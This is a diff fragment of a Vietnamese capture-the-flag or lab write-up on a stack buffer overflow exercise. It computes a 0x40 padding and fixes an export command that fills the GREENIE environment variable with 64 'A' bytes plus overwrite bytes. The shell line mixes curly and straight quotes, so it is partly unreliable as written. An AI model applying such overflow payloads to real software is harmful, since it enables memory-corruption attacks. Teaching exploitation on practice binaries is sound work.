@@ -15,5 +15,5 @@ Chạy thử chương trình thì báo lỗi vì chưa cài đặt biến môi t
 
 biến `modified` ở sau `buf`, nên phần `padding: 0x58-0x18 = 0x40`. bây giờ mình tạo một `environment variable` có tên là `GREENIE` nằm trong cùng đường dẫn với source. Như sau:
 
-`export GREENIE= 'python -c ‘print “A”*64 + “x0ax0dx0ax0d”’`
+`export GREENIE= $(python -c ‘print “A”*64 + “\x0a\x0d\x0a\x0d”')`
 
